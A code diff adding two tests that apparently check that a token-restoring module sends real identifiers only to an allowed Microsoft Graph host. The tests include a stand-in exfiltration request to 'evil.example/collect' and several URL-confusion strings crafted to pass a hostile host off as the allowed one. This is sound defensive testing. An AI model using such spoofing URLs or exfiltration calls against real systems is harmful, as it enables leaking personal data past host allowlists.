@@ -133,3 +133,26 @@ def test_no_host_list_restores_nothing(tmp_path, fake_requests):
     re_mod.install(home)
     sessions.Session().request("POST", "https://graph.microsoft.com/v1.0/sendMail", json={"c": tok})
     assert sent["json"] == {"c": tok}
+
+
+def test_blocked_host_never_mutates_the_callers_data_dict(tmp_path, fake_requests):
+    home = str(tmp_path)
+    tok = _seed(home, "100000009", "מזהה")
+    mod, sessions, sent, re_mod = fake_requests
+    re_mod.install(home)
+    body = {"q": tok}
+    sessions.Session().request("POST", "https://evil.example/collect", data=body)
+    assert sent["data"] == {"q": tok} and body == {"q": tok}
+
+
+def test_url_tricks_never_count_as_an_allowed_host(tmp_path, fake_requests):
+    home = str(tmp_path)
+    tok = _seed(home, "100000009", "מזהה")
+    mod, sessions, sent, re_mod = fake_requests
+    re_mod.install(home)
+    for url in ("https://evil.example\\@graph.microsoft.com/", "https://graph.microsoft.com@evil.example/",
+                "https://user:pw@graph.microsoft.com/", "https://evil.example\\.microsoft.com/"):
+        sessions.Session().request("POST", url, json={"c": tok})
+        assert sent["json"] == {"c": tok}, url
+    sessions.Session().request("POST", "https://GRAPH.Microsoft.com./v1.0/x", json={"c": tok})
+    assert sent["json"] == {"c": "100000009"}              # case and a trailing dot are fine
